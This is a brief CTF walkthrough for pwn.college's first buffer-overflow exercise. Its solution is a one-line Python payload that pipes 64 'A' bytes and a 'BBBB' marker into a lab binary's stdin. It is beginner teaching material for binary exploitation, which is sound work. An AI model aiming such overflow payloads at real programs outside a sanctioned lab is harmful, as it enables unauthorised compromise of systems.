# Stage 01: Your First Overflow (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-first-overflow-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-first-overflow-w`. First buffer-overflow exercise of the module: the payload sends 64 bytes of `A` padding followed by a 4-byte `BBBB` marker into the binary's stdin.

## Solution

```bash
python3 -c "print('A' * 64 + 'BBBB', end='')" | /challenge/binary-exploitation-first-overflow-w
```
